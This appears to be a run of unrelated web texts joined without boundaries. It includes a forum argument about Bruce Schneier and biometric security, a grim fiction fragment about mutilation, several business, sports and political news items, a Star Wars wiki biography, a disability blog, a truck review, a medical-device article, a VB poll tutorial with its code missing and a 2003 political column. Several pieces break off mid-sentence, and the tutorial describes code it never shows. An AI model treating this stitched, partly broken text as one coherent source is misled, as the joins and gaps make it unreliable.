Unfortunately, security in computers has often been viewed as identical with cryptography. The result is that serious and smart cryptographers, like Bruce Schnier become "the experts" on security. But mathematics tends to bias people towards openness, provability and precision. Thus many security techniques which do in fact work with real human beings (such as keeping secrets, if you are smart about it) are often decried by them. In other words, Schnier and others make public pronouncements that are out of their true field of expertise.
If you want to find people who truly understand security, check with the military or banks. They have been dealing with security for millenia. They take a different attitude from cryptographers.
They understand that in most systems, security is a cost/risk tradeoff, not an absolute. Hence they use one or more techniques for a particular security need. A simple ID card might get you into a military base, while to get into some facilities requires the ID card, a special ID, the knowledge of safe door combinations, and perhaps personal recognition by another trusted individual. None of these techniques is perfect by itself, but the combination is remarkably formidable.
Thus biometrics represent a a technique that can be used to enhance security. Can it be defeated? Yes, by itself. How easy is it to defeat? It depends on a number of factors, but especially what other security measures are used along with the biometrics, and how their parameters are set.

Few banks, and no military or intelligence agency in their right mind would be so foolish as to believe that. If you've taken the time to even read the article I linked to, you'd see that Schneier isn't advocating that we not use biometrics at all, but that we not treat them as keys. They have their uses, especially when combined with real keys and other authentication schemes, but to use them alone for authentication isn't generally a good idea.
Granted, sole biometric identification is better than some present identification methods, and could replace them in those areas, where the risk is not high enough to justify the use of more expensive and complex procedures, but does it give sufficient security for many of the domains to which it is being applied? I think not. Biometrics raise the bar a bit, but not high enough to be used on their own for many of the applications to which people want to put them to use.
By the way, you're highly out of date about Schneier's present views on security. If you've taken the time to read his many writings over the years, you'll see how much his attitude towards security has changed since the days of Applied Cryptography, where he naively talks about "protecting ourselves with mathematics." His most famous maxim is now "Security is a process, not a product," and he keeps constantly talking about how security is all about risk management, not risk avoidance.

Your lips have been sewn into small grooves and peaks that provide sensual variety in color and texture. Your body…”
“Shut up!” She shouted the words, putting her hands over the holes where her ears had been. The movement made her tilt, off balance. She collapsed with a moan. The voice coming from everywhere like a god’s voice, saying such things to her. Obscene.
If there was a god, he’d abandoned her months ago.

Duke Realty LP of Indianapolis paid almost $40.9 million for the six-story Water Tower Medical Commons office building near Columbia St. Mary’s Hospital on Milwaukee’s east side, according to state records.
Columbia St. Mary’s leases the 162,000-square-foot building at 2350 N. Lake Drive and owns the land on which it stands. The office and clinic was built in 2007 as Columbia St. Mary’s rebuilt and expanded its Milwaukee campus.
The new landlord for the property will not affect Columbia St. Mary’s operations, Kathleen Schmitz, Columbia St. Mary’s chief communications officer, wrote in an email to The Business Journal.
Seavest Inc., White Plains, N.Y., sold the building on Friday. Duke Realty is a nationwide owner and investor in office, industrial and health care real estate. A Duke Realty official declined to comment.
The investment deal follows a few purchases this year of office buildings and clinics leased to Aurora Health Care, including American Realty Capital Healthcare Trust Inc.’s $63 million acquisition of three buildings in late July.I just checked prices for rental cars for our December vacation & decided to check for off site companies as well.

- "An Imperial Inquisitor has little time for subtlety. He is a hammer designed to pound the galaxy into a shape the Emperor finds pleasing."
- ―Unknown author
Mox Slosin was a member of the Inquisitorius and one of the Emperor's distinguished High Inquisitors.
BiographyEdit
- "The scars from my encounter with High Inquisitor Slosin, both physical and psychological, still run deep."
- ―Tirranna, Alliance to Restore the Republic.
A Human from Entuur, he accepted his native Entuuran culture, giving a high value to pain and suffering. As a High Inquisitor, Slosin was known for his sadistic nature, making his reputation rival that of even notorious Inquisitor Antinnis Tremayne. He was famous for his programming of tendencies on IT-O Interrogator droids, although he personally did not use droids for interrogation.
A very effective interrogator, he however sometimes got too enthusiastic and killed the victim before extracting information. During the subjugation of Fitca Prime, Slosin, who was then only an Imperial Intelligence interrogator, killed Rebel Colonel Shanda Dok when she refused to betray the Alliance. However, as the subjugation was a success, Slosin was transferred to Urce space.
Slosin's flagship was a Trenchant-class cruiser named the Ironhand. Slosin was basically unsupervised as he patrolled the Lesser Plooriod Cluster. Contrarily to other Inquisitors, he actively sought Rebel operatives in the area, commonly traveling through Burna Trade Route and Entana Run.
In 0 ABY, Slosin interrogated Rebel agent Tirranna, a Wookiee. Although Tirrana survived the interrogation, she would keep physical and psychological scars for the rest of her life, as well as an important hatred towards Slosin. Due to her first-hand experience, Tirranna was assigned to write a report on Slosin for the rest of the Rebel Alliance.
In 2 ABY, Slosin was in his mid-50s, but he appeared to be much older due to his prematurely white and scarce hair, to his long and thin beard and to his darker-than-normal wrinkled skin.Bubble Deck Downloads

- 22 November 2013
Are you in the disability loop? Here are our spots from the week in blogs and social media.
Two distinct themes have emerged in disability news this week - people with one hand, and disabled hairdressers.
On Monday I wrote about children's TV presenter Cerrie Burnell, who was born with her right arm ending just below the elbow. When asked, she struggled to come up with a task she thinks is more difficult with a missing hand. She said that her other disability, dyslexia, has a much greater impact on her life.
Also born with a shorter arm is Grace Mandeville - a young actress from Surrey who you might have seen in CBBC's The Sparticle Mystery, which first aired in 2011.
She and her sister Amelia regularly post amusing videos on YouTube on subjects from trick or treating to the contents of their bedrooms. Their quirky home-made films often get around 5,000 views. The latest video is from Mandeville alone, explaining how having one hand affects her.
It turns out that, like Burnell, she's not bothered by practical matters, apart from maybe "cutting a bit of tough steak". She doesn't even mind people staring at her, but what does upset her are unpleasant comments people post alongside her YouTube videos, like: "Look at her stump. That's disgusting."
In the latest video, she says she's not worried about covering it up - though she does have a prosthetic hand to wear if she chooses. Mandeville jokingly says she only uses it at Halloween because it comes in handy for gruesome pranks. A bit like the folk from Amputees in Action, a specialist stunt and acting agency for injured former soldiers, who specialise in whipping off their prostheses in scenes where a character loses a limb in dramatic circumstances. Mandeville likes to scare her friends at Halloween in similar fashion.
She describes her hand as "extremely life-like" and had input in the design which has freckles and unlike her real one, nails that look unbitten.
Her description reminded me of a guest we had on our talk show last January. Gill Hicks, a survivor of the London 7/7 bombings, lost both her legs on the Tube train between London's Kings Cross and Russell Square. When she gets new prosthetics, Hicks told us that she always asks the technicians to add a couple of extra inches, making her taller than she was before.
And so to the next one-handed person who was in the news this week - hair-stylist Ashley Thomson. He wrote a piece for The Kentishtowner six months ago, explaining that "no-one can actually teach me how to be a hairdresser because they don't have one hand but they can show me how it's meant to be done. I watch carefully and then figure out a way to do the style myself."
In a follow-up for the local paper this week, Thomson says a girl who had lost feeling in her right arm after a car accident had emailed him after reading his story. "She had been training to be a hairdresser and was struggling to regain her confidence," he says, reporting he has inspired her to return to college.
Stories which tell of disabled people doing unlikely jobs are real crowd-pleasers. And so, getting back to our game of join the disability dots, and moving it on from limb impairments, we find he wasn't the only disabled hairdresser making headlines this week.
Partially-sighted stylist Dianah Kendall was all over the tabloids on Tuesday. She lost her peripheral vision after receiving a brain injury. Though the Welsh hairdresser can't judge distance and sometimes bangs into obstacles, Kendall says that she can see a head of hair directly in front of her well enough to cut to her usual good standard.
What's interesting about this story are the headlines. Newspapers chose to use terms like "partially blind hairdresser" and "Britain's most blind hairdresser", rather than describing Kendle as having low vision or being visually impaired. Had they told the story of customers in Wales who remain loyal to a hairdresser who can see their heads perfectly adequately... it just wouldn't have had the same impact, would it?

Absence Makes The Heart Grow Fonder
Ford had a plan when it pulled the Ranger off the North American market last year. It all made sense to kill the Ranger off without offering up a comparable replacement, especially since sales had been sliding for over a decade. Instead of introducing the new T6 Ranger, the same one that 180 other countries around the world gets, Ford bet on Stateside in-market owners to take the step up into the full-size F-150. However, there was a minor issue with that strategy. Those looking to replace their old Ranger aren't taking to Ford's plan. Instead, some are looking to other similar-size offerings from Toyota and Nissan while others are hanging on to what they have.
Even with dwindling sales, the Blue Oval Boys were subjected to an excess of criticism and that's still being heard a year later. Ford staunchly defended its decision to axe the Ranger in the United States and Canada, though, while stating that hopes were high for the global version. This only added insult to injury for those who couldn't get their hands on a new Ranger. Making things worse, Ford tested the Global Ranger's durability, altitude, and towing capabilities in the States. Even still, the Dearborn-based automaker reiterated that sagging sales as well as a similar chassis size and price tag to that of the F-150 led to the decision of excluding the new Ranger from its North American lineup.
It's no secret that the midsize pickup truck segment is shrinking, with only the Toyota Tacoma and Nissan Frontier currently available in North America, but reinforcements are rumored to be on the way. The redesigned Chevrolet Colorado has been confirmed to live on in North America and is supposed to resurface later this year. With this announcement, General Motors has a golden opportunity to pick up the top-selling midsize pickup mantle left behind once the North American Ranger exited the market. Ford hasn't said whether the Ranger will return or not but whispers say it will see how GM fares once it releases the Colorado back into the wild. For midsize pickup shoppers, who are notorious for picking a truck that best suits their needs instead of going bigger just because, this is a good sign.
In the meantime, the 2013 Global Ford Ranger continues on with three different engine choices, a 2.5-liter Duratec 25 inline-four, a 2.2-liter Duratorq inline-four, and a 3.2-liter Duratorq inline-five. Each of which can be mated to a five- or six-speed manual transmission as well as a six-speed automatic gearbox. Both 4x2 and 4x4 capabilities are available on the new Ranger, too. For our drive with the 2013 Global Ford Ranger, we were given a 2.5-liter Duratec 25 inline-four, partnered with a five-speed manual transmission to produce 175-horsepower and 172 pound-feet of torque. The double cab configuration is good for 42.7 cubic-feet of cargo space and the T6 Ranger's bed yields 10 separate tie-downs. A wide rear window made it effortless to see behind the T6 Ranger and if you're carrying cargo in the bed, it's easily in view as well.
At 211 inches long, the Global Ford Ranger Crew Cab is 8 inches shorter than the North American variant with the same configuration. The T6 Ranger Crew Cab checks in at 72.8 inches wide while the Ranger Crew Cab that just left the North American market had 69.4 inches of girth. North America's Ranger Crew Cab featured a wheelbase of 125.9 inches while the T6 Ranger Crew Cab's wheelbase stretches out to 127 inches. Despite the Global Ranger's measurements being similar to the North American version, the T6 felt more composed when taking a corner at speed. Handling also benefits from these proportions as it feels sharper and more responsive.
Inside, the 2013 Global.
Other midsize pick-up truck models still available in North America have a rear seat that's better served as storage space than a place to sit. The T6 Ranger, however, features a rear seat that's supportive and not uncomfortably upright. Space is abundant inside the Global Ranger and rear legroom can accommodate a full-grown adult. The one major issue we found with the 2013 Global Ford Ranger though was that the clutch, brake, and gas pedal were positioned too close together. When attempting to row through the gears, we accidentally tested the seatbelts simultaneously as it was nearly impossible not to step on both the clutch and brake at the same time.
There's no denying that the North American midsize pickup truck segment is currently experiencing a reduction in size. In-market owners don't have much to choose from when it comes time to replace their ride. No matter what Ford thinks, Ranger owners have already shown they aren't willing to make the jump into the F-150. So it appears we have a stalemate for the time being. Ford won't budge on bringing the Global Ranger to North America and midsize pickup owners won't migrate into something bigger. A possible return date for the Ranger could arrive soon after Chevrolet launches the redesigned Colorado though as Ford may want to see how its crosstown rival fares. Nevertheless, one thing is for sure, if the Global Ranger finally does make it to North America, we expect it to quickly ascend back up the ladder to take its normal spot at the top of the midsize pickup heap.Varlamov's Stellar Year Not Lost in Translation
Avalanche goalie finalist for Vezina after franchise-record 41 regular-season wins
Semyon Varlamov is still working on mastering the English language, but his game translates anywhere.
The Avalanche goaltender has been outstanding in Colorado's first-round series against Minnesota, but it was his work in the regular season that made him a finalist for the Vezina Trophy, given annually to the top netminder in the NHL.
Boston’s Tuukka Rask and Tampa Bay’s Ben Bishop are the other two finalists for the honor, which was announced Friday and will be presented during the NHL Awards Show in Las Vegas on June 24.
“Of course it’s a big deal for me. I’ve never been nominated for the Vezina,” Varlamov said. “It’s a great feeling.”
Varlamov is in the running for the award after one of the best seasons in franchise history. His 41 wins broke Patrick Roy’s record set in 2000-01, and he led the league in shots faced (2,013) and saves (1,867).
Roy was happy to have his record broken and has consistently said Varlamov should win the NHL MVP after the season he put together.
“He should be a candidate for the Hart Trophy,” Roy said. “That’s as high as I think of him right now. Varly has been our best player; he’s been phenomenal for us from the get-go.”
Varlamov was outstanding in the Avs' two games in Minnesota this week, keeping his team in both contests and giving Colorado a chance to steal both. He stopped the first 45 shots by the Wild on Monday before the Avalanche lost a hard-fought game, 1-0, in overtime. He then followed that with a 30-save performance in Game 4, which was decided by a Minnesota goal that came on a tough-luck bounce in the second period.
His performance in the postseason is a continuation of how he played in the regular season. He was one of the biggest reasons for Colorado’s turnaround after posting just 16 wins in 2012-13.
Still, he deflected credit when asked about being named a Vezina Trophy finalist.
“Without my teammates, I don’t think I could win this trophy, because my teammates have done a great job for me this year, played very well for me,” he said. “My coaches, [Colorado goaltending coach] Francois Allaire, Patrick, they've done a great job for me as well. That’s why I have a good result.”
Roy and Allaire mentored Varlamov in the summer, and the goalie was a willing pupil. Varlamov said Allaire worked with him on lateral movement and convinced Varlamov to hold his glove higher and at a slightly different angle, giving shooters less net.
The results were significant. His goals-against average went from 3.02 last season to 2.41 this year, and his save percentage went from .903 to .927.
In the postseason he has only gotten better, but he shakes off any praise.
“The goalies have to face lots of shots. That’s your job – stop the puck. It doesn’t matter how many shots, you have to continue to work, continue to just work hard, keep fighting. We knew it was not going to be an easy series for us.”
DUCHENE GETTING CLOSER
Avalanche fans got an encouraging sign when center Matt Duchene took part in Saturday’s morning skate at Pepsi Center. Although Roy said Duchene will not play in Game 5 the signs are there that he could play in the series, with Game 6 scheduled for Monday in St. Paul and Game 7, if necessary, back in Denver on Wednesday.
Duchene has not played since spraining the medial collateral ligament in his left knee March 29, and the team projected he would be out roughly four weeks. Saturday marks the fourth week and it is apparent Duchene is nearing a return.
That’s a positive development for his teammates, who enjoyed having their leading scorer skating with them.
“In the playoffs you don’t get too many extra boosts," rookie center Nathan MacKinnon said. "Knowing we’ll get him back soon, and he won’t be out the rest of the year, is a boost."
QUICK HITTER
Roy said he will decide before tonight's game whether to play Joey Hishon or Paul Carey on the fourth line. Carey skated in the first three games of the series, and Hishon made his NHL debut Thursday in Game 4.Daily Pivots: (S1) 157.52; (P) 157.88; (R1) 158.45; More.....

For remote productions, TV5 crew members use the Eclipse and FreeSpeak in the studio to collaborate effortlessly with those in the field on the Tempest2400. For those productions in more distant regions, the Tempest2400 system is employed in the station’s flypacks. TV5 finds the Tempest2400 to be especially useful in these situations, as the intercom’s Frequency Hopping Spread Spectrum (FHSS) technology ensures interference-free communications. With six antennas installed per studio, FreeSpeak offers wireless mobility across the TV5 complexes. If for some reason, an intercom panel or system is not working, TV5 has Clear-Com Concert, an intercom-over-IP conferencing software, as a secure communications backup. Concert interfaces with the Eclipse and FreeSpeak systems from a virtual intercom panel on a PC or laptop.
“We are proud that TV5, one of the most prestigious broadcasters in the Asia-Pacific region, has chosen to go with a full range of Clear-Com products,” says Edmund Song Clear-Com’s Regional Sales Manager, Southeast Asia. “It’s an excellent real-world example of the inherent adaptability and interoperability of the Clear-Com products. As a consistent industry leader with a market coverage matched only by our reputation for innovation, Clear-Com provides intercom systems that are the fundamental building blocks for any broadcast stations’ success.”
Currently, the Novaliches and Broadway facilities’ intercoms are only connected via IP within each site, but TV5 has plans to link both matrix frames via fiber in the future.<<

Ralph Miller talks about the time he spent working at Caldwell Sugars Co-op Tuesday afternoon at the site of the old mill, just north of Thibodaux.Abby Tabor/Staff
Published: Wednesday, December 29, 2010 at 11:01 a.m.
Last Modified: Wednesday, December 29, 2010 at 11:01 a.m.
- Editor’s note: One in a series on local institutions, traditions that no longer exist.
THIBODAUX — Caldwell Plantation Road is a poorly maintained gravel path off La. 308 that sees little traffic. Decrepit houses, invaded by tall yellowed grass, and idle tractors, some that appear to have been undisturbed for years, line the road that once led to a booming business.
“I never thought I’d see the day,” said Ralph Miller, staring at the remains of Caldwell Sugars Co-op, a once sprawling sugar-cane mill just north of Thibodaux. Today, a lone gray smoke stack stands like a sentinel over the mill’s crumbled remains.
Miller, 75, worked at Caldwell Co-op from 1955 to 1965, 10 “hard years but some of the best years of my life.” He was in charge of payroll.
Caldwell Co-op was formed in 1946 after 23 sugar-cane farmers pledged more than $302,000 and bought Caldwell Sugars’ assets, including a refinery and four plantations.
The Co-op was in operation for 55 years. It closed in 2002.
When Miller stares at the bulldozed remnants, he said he is filled with memories of what used to be there.
Workers lived on the plantation property. The entire area, Miller said, was a self-sufficient, contained community.
“Everybody was dependent on each other,” he said. “It was just like a city of its own. I just hated to see it closed.”
Workers were provided with free housing, which helped stretch Miller’s $68 biweekly paycheck. There was also a company store.
Trips into Thibodaux were rare, he said, because the workers and their families had most of what they needed on the property.
“It was just so well coordinated,” he said.
In January 2000, members of Caldwell, Glenwood Cooperative in Napoleonville and St. James Sugar Cooperative in St. James merged, creating South Louisiana Sugars Cooperative. The board decided to upgrade Glenwood and St. James and shut down the Caldwell mill, according to a 2002 Daily Comet article.
The closure left Lafourche Parish with only two sugar-cane mills, Lafourche Sugars in Thibodaux and Raceland Raw Sugar.
Caldwell was, one local history professor said, one of the last holdouts of a culture that has slowly faded in Louisiana.
“You have to look at the decline as a trend that’s been going on possibly since the introduction of sugar in Louisiana back in the early 19th century,” said Paul Leslie, a retired Nicholls State University history professor. “It’s a trend based on consolidation.”
In 1977, Lafourche was home to six sugar mills. In 1978, that number dropped to five; and in 1980, three, according to the same Daily Comet article.
“This is a trend that has hit the automobile industry, too,” Leslie said. “Bigness became a way by which to improve efficiency. (Caldwell) just found themselves in a bind. They couldn’t find enough cane to justify their existence.”
The mill’s closure still surprised some.
“Even though we left there, I never thought I’d see the day when they closed it,” said Ray Boudreaux, who lived on the planation property for the first 18 years of his life. “It was a good life. It was nothing easy, but it was a good life.”
Boudreaux, whose father worked at the mill “basically until he died,” said sugar dominated day-to-day life.
“When I was a kid, that’s all we knew,” he said. “We didn’t think of any other kind of work. At one time, we had almost everyone in the family working there.”
He said the mill workers — his neighbors — helped make a vibrant, friendly community.
Hundreds of workers lived in individual houses and in a larger boarding house that no longer exists.
“Everybody knew one another. People were people then,” he said. “I got a house here and I got a house in New Orleans, and I’d trade it all to get back.A couple of days ago I had the unfourtunate idea to enhance my security by manipulating the settings in the component services(local) and I`ve disabled ;remote acces connection manager, remote procedure call, telephony and a few other things and since then I`ve been in Hell.

Several things:
Microsoft do not seem to understand what "Remote Access" is. "Remote Access", to anybody except Microsoft, means allowing remote access to a machine (like, VNC, Terminal Server or PcAnywhere). However, to Microsoft, "Remote Access" means the server-side of dial-up networking.
Secondly, "Telephony", does not mean "Telephony" to Microsoft. Instead, it means "Stuff which controls modems".
It is likely that both of those are required for some broadband connections to work, as DSL / ADSL connections seem to pretend to be a modem (even though they're not) to Windows, and hence get treated accordingly.
Forum RulesEmergency tool could help save lives
American Medical Response will help critical patients
Community is one of Marc Burnham's favorite words.
'One thing about AMR is that it is very family oriented and our employees are part of the community as coaches and troop leaders, and I'm on county boards and am executive vice chair for the Clackamas County Chamber of Commerce,' he said.
So that may explain why Burnham, who is operations manager for American Medical Response in Clackamas County, is so excited about a new device that AMR's EMTs and paramedics have been using for almost a year.
Ever since May 2006, when AMR's county contract was renewed, 'we've been upgrading and adding extra services to the county. We have the modular ambulance, the King Airway, the 12-lead cardiac ECG and now we have the EZ-IO, for faster and easier vascular access,' he said.
EZ-IO saves lives
'The IO in EZ-IO stands for intraosseous, and this and the other new tools have increased the total scope of EMT options,' said Jan Acebo, a paramedic and AMR's training officer for Multnomah County.
The product is made by Vidacare, and the company's Web site explains that 'the intraosseous space is a specialized area of the vascular system where blood flow is rapid and continues even during shock. Drugs and fluids infused via the intraosseous route reach the central circulation as quickly as those administered through standard IV access.'
Essentially, the EZ-IO allows EMTs or paramedics to use a drill-like tool to insert a needle into the bone to 'gain vascular access through the bones of a critical patient,' Acebo explained.
'The purpose of this in a field setting is to [introduce] life-saving fluids, like a normal saline solution, and medication' into the veins of a critical patient, Acebo said.
Examples where the EZ-IO has been used in the field include cardiac arrest, respiratory arrest, trauma from accidents and drug overdose cases, he added.
'When a critical patient needs vascular access immediately, this device can be deployed. In the case of cardiac arrest, the veins might have collapsed; in trauma, there might be no blood volume; in respiratory arrest or if the patient is obese, maybe we can't find the veins; or in the case of a drug-overdose patient, scar tissue from years of drug abuse might cover the veins,' Acebo said.
Before the invention of the EZ-IO, doctors had to use a manual device called the Jamshidi, he noted. It was difficult to use, and medical personnel had to exert considerable pressure to get the needle into the bone.
But the EZ-IO has a drill that is much easier to use, and technicians can have vascular access in critical patient in seconds, as compared to three to seven minutes, using other devices.
There are only two sites that the FDA has approved the use of the EZ-IO on the body, one below the kneecap and one near the ankle.
'Those are optimal sites, with [good] accessibility for the majority of patients,'
Acebo said, adding that in many emergency situations, the 'tense action' is near the head or heart, so 'the legs [provide] a site that doesn't interfere with anybody's work.'
Although it may seem that drilling into a patient's bone would be painful, Acebo said that the action 'only starts to hurt when we send in fluid, which starts tickling those nerve endings [in the bone].'
If the patient is unconscious, medical personnel don't worry about pain, but in a conscious patient 'we send a small amount of lidocaine through the needle' for pain relief, he noted.
The other advantage to the EZ-IO is that there are two sizes of needles, one for adult critical patients and one for children, so there 'is pediatric access' when children are involved in a medical situation, Acebo said.
He added that the EZ-IO has 'revolutionized care and has given us a tool to quickly and safely have vascular access in critical patients.'
In the community
Burnham is pleased with the new technology that allows medical personnel to more efficiently save lives in the county, but he pointed out that AMR is involved in other activities to help citizens.
Dale Miller, a Clackamas County supervisor for AMR, works with Oregon Impact, a group that stages accident simulations at area high schools before prom or graduation to discourage drinking and driving. The company's river rescue unit will be back at High Rocks, near Gladstone, in late May.
Last year, Burnham said, the river rescue team saved five lives and worked on 39 assists.
'It's a team effort with the Oregon City police and the Gladstone police. When we are there, people are better about drinking.'
River rescue units provide education about why it is not a good idea to jump into extremely cold water, and they let people know about the current of the river and where submerged logs are. They provide informational flyers in both English and Spanish, as well.
Burnham added, 'There have been no drownings since we've been there. We're very proud of that.'

Description
Presenter
Randy Revell, Founder and President Context Associated
Presentation Overview
The Ownership Attitude
We all know what it means to own something, as in "I own my car, house or plane." There is another aspect of ownership, however, one that is more of an attitude than an actuality. As company founders, we are all business owners, but despite this legal sense ownership, it is far too easy to cede the ownership attitude in situations which we do not control, such as when we seek venture capital financing. This ownership attitude has to do with the degree to which you are willing to be responsible for the outcome in any given situation. To adopt such an attitude in a situation that you do not control is challenging, yet extremely productive. We are pleased to announce Randy Revell, the Founder and President of Context Associated as our guest speaker. Since 1978, Context Associated has assisted successful people and organizations from around the world to become even more effective in producing the results they want. Randy Revell will review numerous aspects of the ownership attitude and assist those of us in attendance to examine where we draw the line of ownership in different parts of our lives.

Color scheme? Blue / Yellow Q&A. The only thing I might call Dawkins out on is that he doesn't really acknowledge enough how exceptional human intelligence is. At one point, he says "the brain power of chimpanzees is high, though not so high as ours". This is almost disingenuous, even if by accident. Human intelligence is dramatically higher than any other species, including a chimp. A chimp's intelligence doesn't even rival that of a stupid human infant. Our speech, ability for abstract thought, social skills, and ability to reason are utterly superior. The exceptional nature of human intelligence is worth highlighting, lest it be suggested that we're trying to claim that chimps are kind of 50% as intelligent or something. :-) In fact, it's funny that creationists always pick on the eye as an example of that which is too complex to have evolved. I'd pick the human brain... that IS pretty tough to explain.
Permalink Wed, 06 Oct 2010 14:57:19 UTC | #529900If investors needed to be reminded how important monetary policy is for sharemarkets, then Thursday’s unexpectedly strong employment report was timely.
Shares fell more than 1 per cent and holders of Australian bonds were also blindsided by the highest number of jobs created since November, 2002 as both markets reacted to the idea the official cash rate might not be going any lower.
Indeed, following the massive surge in jobs – total employment rose 71,500 in February, compared with the average forecast of closer to 10,000 – the interest rate market has nearly unwound any sort of rate cut altogether.
The implied cash rate is now 2.90 per cent by November this year when at the start of the year a fall to 2.5 per cent by the end of the year was tipped.
As a result, bond prices sank and yields soared across the spectrum of short and long-dated maturities as bonds extended their recent sell-off that this week pushed the yield on the benchmark three-year bond above the Reserve Bank of Australia’s overnight cash rate, now at 3 per cent, for the first time since July 2011.
But before everyone heads to their mortgage provider to lock in their fixed rate home loan rate, some economists were questioning if the numbers were just too good to be true.
The monthly numbers can always be volatile but should be treated with some suspicion when the swings are that large.
As BT’s Chris Caton points out, about 65 per cent of the jobs created came from part-time males but they make up around 9 per cent of total employment.
“It’s good news; just not as good as it appears at first glance,’’ Caton says.
But the bond market bears won out on Thursday and they are in the all-news-is-good-news phase that leads to higher yields.
Yields, after all, have been rising for the past couple of months, on the back of good economic data – domestic and offshore.
And equity investors don’t seem to be too worried.
Mos appear to be thinking that the rally needed to slow down and some consolidation was overdue.
But in the back of their minds must be the possibility of a more severe sell-off.
According to Goldman Sachs, over the past 12 years the months of March and April have been the trigger point for a correction on Wall Street about 50 per cent of the time.
In 2011 and 2012, stocks peaked in April and March respectively and March also sparked a sell-off in 2000, 2002, 2004 and 2005 the broker told clients in a note.
The major bank stocks are most at risk here as they carry the most leverage.
They’ve had a great run but life gets tougher if yields start to rise and stay higher.
If investors continue to get better than expected economic data here and in the United States, then bond yields will keep rising.
And shares, having gained around 30 per cent in nine months, will also start to be a cause for worry about the impact of higher interest rates.
Morgan Stanley’s equity strategist Gerard Minack thinks that central banks have won the battle of sustaining recoveries in the major developed economies by keeping monetary policy but worries they might not win the war.
“Winning the battle isn’t winning the war. If central bankers do win this round, the next downturn could be, in my view, an omnishambles," he has told clients.
He worries that, as a result of ultra low interest rates, there has now been a rise in leverage.
That is happening in the US, he says, with aggregate non-financial debt to GDP rising in the December quarter, the first increase in four years.
Another worrying sign for him is the record low yields on junk bonds that implies investors are mispricing risk.
Minack thinks the most important test now for investors is the “ability of the US to cope with fiscal tightening".

SwitzerlandCreating Online Poll System with Percentage Results VB
See more tutorials in XML. This post has No Comments.
This tutorial will show you how to create an online poll system which makes use of AJAX, XML and LINQ and will provide percentage results. VB.NET
Poll systems can be very useful for gathering a large amount of data quickly. They usually require no registration, and are mainly used to gather such information as opinions or trends. Visitors to your website are usually willing to take part in Polls because they usually do not require any personal information, and people are interested in other’s views.
In this tutorial, you will learn how to create an online voting system where anyone can vote, and we can see the results of the poll – including a percentage of the answers.
The system will use XML for storage of votes, and AJAX to enable instant results. We will start by creating the structure of the XML file:
Next, we can start on the ASPX page. Add in the ScriptManager and UpdatePanel tags:
[thml]
[/html]
Now we can build our Poll form inside the UpdatePanel, so that AJAX can reload it without performing a full PostBack.
We will be using a TextBox, RadioButtons, Buttons, and a Label and Literal control. Our ASPX page will look something like this:
Notice we have two buttons on our page – one to submit the vote, and the other to show the current results.
First, we will code the submit button. We want this button to check that a name has been entered and that an option has been selected:
The submit button doesn’t perform anything but validation, we then call a method to submit the vote to the XML file:
This method uses LINQ to first open the XML file and then add a new element to it with the values the user submitted. We then save the updated XML file and output the current results to the page, by calling the readXML method:
Again, this method makes use of LINQ to open the XML file and get all data within. It then loops through all the data and counts the number of votes for each candidate, then performs a simple calculation to determine the percentage for each. Finally, we output the results to the web page, using the Literal control.
We also code the show results button to call the readXML method:Penelope Cruz Gossip

SPRINGFIELD-Gov. Pat Quinn is expected to announce a rewrite Tuesday of legislation that would end Illinois’ last-in-the-nation prohibition on gun owners carrying their weapons in public places, multiple sources confirmed Monday night.
Details of Quinn’s anticipated amendatory veto of the Firearm Concealed Carry Act remained a closely guarded secret with only the governor’s office announcing a scheduled Tuesday appearance with reporters to take action on the bill.
Late Monday, a Quinn spokeswoman would not confirm how Quinn would modify the legislation, which passed both chambers of the General Assembly by overwhelmingly lopsided margins on the last day of the spring legislative session in May.
But.
Attorney General Lisa Madigan has not decided whether to appeal the appeals ruling to the U.S. Supreme Court.
Phelps said he was not given specific details of how Quinn would rewrite the bill but said he believed the governor would:
–require the weapons be “completely” concealed, not just “mostly” concealed;
–limit a person to carrying only one weapon and one ammunition magazine carrying no more than 10 rounds;
–bar concealed weapons in all facilities that serve alcohol;
–prohibit concealed weapons in the workplace unless employers give “express permission” and grant employers the ability to prohibit employees from bringing or carrying weapons on all private property;
–eliminate the ability of a concealed weapon permit holder to remove their weapons in a parking lot for the purpose of moving it between the vehicle’s passenger compartment and its trunk.
The governor’s office would neither confirm nor deny those changes.
If Quinn acts according to Phelps’ script, the governor will run headlong into a likely override effort in the House and Senate, which passed the legislation by what are known as veto-proof majorities..

Friday's test will evaluate all of the interceptor's systems, including the sophisticated radar that tracks the incoming missile, the interceptor's guidance system and the "kill vehicle" designed to smash into the missile in space.

May 1, 2003
By Japhy Ryder
Yes, yes, yes. We should be concerned about the implications
of the Patriot Act. We should be acutely concerned about the
Bush Administration's seemingly unabated thirst for power
and control. Yes, Ashcroft should be feared.
But these are the things that should be concerning us most
about our eroding freedom of speech:
The conservatives are now in control of all three branches
of the federal government. Talk radio passes for news, and
the news no longer concerns itself with objectivity or presenting
a balanced story.
This again should cause concern, but not as much as the everyday
thought police throughout the country.
I'm talking about the local school that bans children from
wearing a shirt that questions the President. I highly doubt
there would've been much consternation if a child had worn
a "Slick Willy" shirt.
Wearing a peace symbol is now considered traitorous. Believing
in peace is now considered anti-American; worse, conveying
those beliefs can get you into serious trouble.
We've so far only had a few unwarranted arrests for advocating
peace, generally among protestors, where it's been well known
that police will arrest a protestor for doing anything other
than simply standing. But we are headed down the path where
expressing a view, contrary to the party in power, might land
you in prison. And there seems to be no outrage!
Kids are sent home from school for voicing their opinions.
People are losing their jobs for questioning the Administration.
Artists are receiving death threats from the rabid right-wingers
for having the audacity to question whether Bush really has
the best interests of the country in mind.
And there is no outrage.
Sure, there's outrage among the left. We're trying to tell
people what's happening, but the Administration, along with
getting the general population to go along with the Thought
Police mentality, has convinced them that liberals are wackos,
flitting along with our silly liberal ideas. Give the Bush
team this, they are wonderful propagandists.
I don't want us to be right about this. I really don't. I
will derive no satisfaction from telling them that we were
right after the fact. But it is happening before our very
eyes. There is less and less dissention against this Administration,
and they couldn't be happier. Senator Kerry made a completely
valid statement about regime change in America, Bush questioned
his patriotism. A privileged military evader questioned the
patriotism of a veteran. And got away with it! Kerry
was forced to apologize to feed the salacious appetite of
our increasingly right wing media and populace.
And this sort of thing is happening every single day in America.
Most of the stories go unwritten, but rest assured they are
happening. Living in the South (Jerry Falwell's Lynchburg,
VA to be exact) I dare not mention my political views or thoughts
of the Administration while at work. I understand the consequences
that my doing so could bring about. Meanwhile down the hall
from me another manager blasts Hannity in his office for all
to hear.
Were I to hang a peace symbol in my office, I would probably
be hauled into my boss' office to hear how important it is
to support the troops.
There is a brainwashing going on right now. And it is reactionary,
nationalistic, paranoid and frightening. It's being led by
George W. Bush and a cadre of right wingers starving for power,
money and complete control. And it seems way too familiar.
